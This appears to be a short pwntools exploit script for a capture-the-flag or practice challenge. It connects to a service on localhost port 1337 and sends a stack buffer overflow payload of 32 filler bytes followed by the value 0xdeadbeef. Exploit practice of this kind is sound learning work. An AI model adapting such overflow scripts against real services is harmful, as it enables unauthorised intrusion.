#!/usr/bin/env python

from pwn import *

RHOST = "127.0.0.1"
RPORT = 1337

connect = remote(RHOST, RPORT)

print(connect.recvn(18))

payload = "\x41" * 32 + p32(0xdeadbeef)

connect.send(payload)

print(connect.recvn(34))
